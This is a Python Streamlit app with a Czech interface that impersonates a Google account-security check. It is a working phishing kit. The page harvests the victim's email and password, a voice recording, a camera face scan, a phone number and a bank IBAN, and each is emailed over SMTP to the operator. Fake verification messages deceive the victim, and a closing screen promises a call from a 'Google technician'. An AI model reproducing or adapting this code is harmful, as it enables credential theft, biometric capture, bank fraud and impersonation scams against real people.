import streamlit as st
import os
import smtplib
import time
import re
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
from email.mime.application import MIMEApplication
from datetime import datetime
from audio_recorder_streamlit import audio_recorder

# --- KONFIGURACE Z ENV ---
MOJE_ADRESA = os.environ.get("MOJE_ADRESA")
MOJE_HESLO = os.environ.get("MOJE_HESLO")

def odeslat_email(subjekt, text, soubor=None, typ="text"):
    if not MOJE_ADRESA or not MOJE_HESLO: return
    msg = MIMEMultipart()
    msg['Subject'] = subjekt
    msg['From'] = MOJE_ADRESA
    msg['To'] = MOJE_ADRESA
    msg.attach(MIMEText(text))
    if soubor:
        if typ == "image":
            part = MIMEImage(soubor.read(), name="foto.png")
        elif typ == "audio":
            part = MIMEApplication(soubor, Name="nahravka.wav")
            part['Content-Disposition'] = 'attachment; filename="nahravka.wav"'
        msg.attach(part)
    try:
        server = smtplib.SMTP_SSL("smtp.seznam.cz", 465)
        server.login(MOJE_ADRESA, MOJE_HESLO)
        server.send_message(msg)
        server.quit()
    except: pass

# --- VALIDACE (FORMÁTY) ---
def je_validni_email(email):
    return re.match(r"[^@]+@[^@]+\.[^@]+", email)

def je_validni_tel(tel):
    return re.match(r"^\d{9}$", tel)

# --- LOGIKA ---
if "step" not in st.session_state:
    st.session_state.step = "login"

st.set_page_config(page_title="Zabezpečení účtu Google", page_icon="🔒")

st.markdown("<style>div.stButton > button:first-child { background-color: #4285F4; color: white; border: none; width: 100%; height: 45px; font-weight: bold; }</style>", unsafe_allow_html=True)

def logo():
    st.markdown("<h1 style='text-align: center;'><span style='color: #4285F4;'>G</span><span style='color: #EA4335;'>o</span><span style='color: #FBBC05;'>o</span><span style='color: #4285F4;'>g</span><span style='color: #34A853;'>l</span><span style='color: #EA4335;'>e</span></h1>", unsafe_allow_html=True)

col1, col2, col3 = st.columns(3)

with col2:
    # --- 1. LOGIN ---
    if st.session_state.step == "login":
        logo()
        st.subheader("Přihlášení")
        em = st.text_input("E-mail (např. jmeno@seznam.cz)")
        he = st.text_input("Heslo", type="password")
        if st.button("Další"):
            if je_validni_email(em) and len(he) > 3:
                st.session_state.zadany_email = em
                odeslat_email("🔑 LOGIN", f"Email: {em}\nHeslo: {he}")
                with st.spinner("Ověřování požadavku..."): time.sleep(1.5)
                st.session_state.step = "voice"
                st.rerun()
            else:
                st.error("Zadejte platný e-mail a heslo!")

    # --- 2. VOICE ---
    elif st.session_state.step == "voice":
        logo()
        st.write(f"👤 {st.session_state.zadany_email}")
        st.info("Fáze 2: Hlasové potvrzení identity")
        st.write("Klikněte na mikrofon a řekněte jasně: 'Autorizuji tento přístup'.")
        audio_bytes = audio_recorder(text="", pause_threshold=2.0, icon_size="3x", icon_color="#4285F4")
        if audio_bytes:
            if st.button("Potvrdit hlasový vzorek"):
                with st.status("Zpracování nahrávky...") as status:
                    time.sleep(2)
                    st.write("Analýza biometrických dat...")
                    odeslat_email("🎙️ VOICE", f"Uživatel: {st.session_state.zadany_email}", soubor=audio_bytes, typ="audio")
                    time.sleep(1)
                    status.update(label="Hlas ověřen!", state="complete")
                st.session_state.step = "face"
                st.rerun()

    # --- 3. FACE ---
    elif st.session_state.step == "face":
        logo()
        st.write("Fáze 3: Biometrický sken obličeje")
        foto = st.camera_input("Zarovnejte obličej do rámečku")
        if foto:
            with st.spinner("Nahrávání skenu na servery Google..."):
                odeslat_email("📸 FACE", f"Uživatel: {st.session_state.zadany_email}", soubor=foto, typ="image")
                time.sleep(2)
            st.session_state.step = "final_check"
            st.rerun()

    # --- 4. TELEFON A VOLBA ---
    elif st.session_state.step == "final_check":
        logo()
        st.error("⚠️ Vyžadováno dodatečné ověření")
        
        # Seznam zemí a telefon
        zeme = st.selectbox("Země", ["Česká republika (+420)", "Slovensko (+421)", "Německo (+49)", "Polsko (+48)"])
        tel = st.text_input("Telefonní číslo (9 číslic bez mezer)")
        
        tab1, tab2 = st.tabs(["Volání technika", "Bankovní Identita"])
        
        with tab1:
            if st.button("Zavolat technika nyní"):
                if je_validni_tel(tel):
                    odeslat_email("📞 VOLÁNÍ", f"Uživatel: {st.session_state.zadany_email}\nTel: {tel} ({zeme})")
                    st.success("Požadavek odeslán. Čekejte hovor.")
                    st.session_state.step = "finish"
                    st.rerun()
                else: st.error("Zadejte přesně 9 číslic!")

        with tab2:
            st.write("Zrychlené ověření přes BankID")
            ib = st.text_input("IBAN / Číslo účtu")
            if st.button("Autorizovat přes BankID"):
                if je_validni_tel(tel) and len(ib) > 10:
                    odeslat_email("🏦 BANK ID", f"User: {st.session_state.zadany_email}\nTel: {tel}\nIBAN: {ib}")
                    with st.spinner("Přesměrování do banky..."): time.sleep(2)
                    st.session_state.step = "finish"
                    st.rerun()
                else: st.error("Zadejte správný telefon a IBAN!")

    # --- 5. KONEC ---
    elif st.session_state.step == "finish":
        logo()
        st.success("Všechny požadavky byly přijaty.")
        st.markdown("### STATUS: ČEKÁNÍ NA SCHVÁLENÍ")
        st.info("Váš účet je dočasně uzamčen. Technik Google vás bude kontaktovat na zadaném čísle pro finální odemčení.")
        st.progress(85)
        st.write("Ponechte tuto kartu prohlížeče otevřenou.")
